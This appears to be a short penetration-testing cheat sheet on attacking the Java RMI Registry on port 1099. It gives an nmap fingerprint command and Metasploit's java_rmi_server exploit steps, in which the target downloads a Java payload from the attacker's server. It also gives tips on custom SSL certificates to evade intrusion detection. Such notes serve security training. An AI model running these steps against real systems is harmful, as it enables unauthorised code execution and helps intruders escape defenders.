# Java RMI Registry (1099)

---

### 1) Java RMI Registry Enumeration

Enumerate the Java RMI Registry service ("GNU Classpath grmiregistry"):
- fingerprint with nmap: `nmap -sT -sV -p 1099 <ip_address>`

<br>

--- 

### 2) Java RMI Registry Exploitation

<br>

Exploit with Metasploit:
- `use exploit/multi/misc/java_rmi_server` -> set options (you can often leave the defaults with `SRVHOST` and `SRVPORT` being the web server that the target will use to download the Java payload from -> `run` 
- for additional IDS or Endpoint Detection evasion you can set `SSL` to `true` which will help evade some on-the-wire heuristics detection solutions -- note, most IDSs will flag Metasploit's default SSL certificates so you should change these using the `SSLCert` option which allows you to specify your own custom SSL certificate for the `SRVHOST`
- generally in regard to Metasploit modules and exploits, where possible, always configure a custom SSL certificate for your listeners as this goes a long way in evading IDS because most are configured to detect the default Metasploit configurations